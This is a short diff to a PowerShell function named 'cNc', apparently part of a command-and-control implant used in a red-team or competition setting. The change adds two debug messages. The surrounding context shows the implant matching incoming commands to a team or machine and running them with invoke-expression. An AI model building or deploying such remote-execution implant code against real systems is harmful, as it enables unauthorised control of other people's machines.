@@ -189,7 +189,9 @@ function cNc{
         if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
             invoke-expression $read[2]
         }
+        write-output 'wrong team'
     }
+    write-output 'wrong machine'
 
     
 }
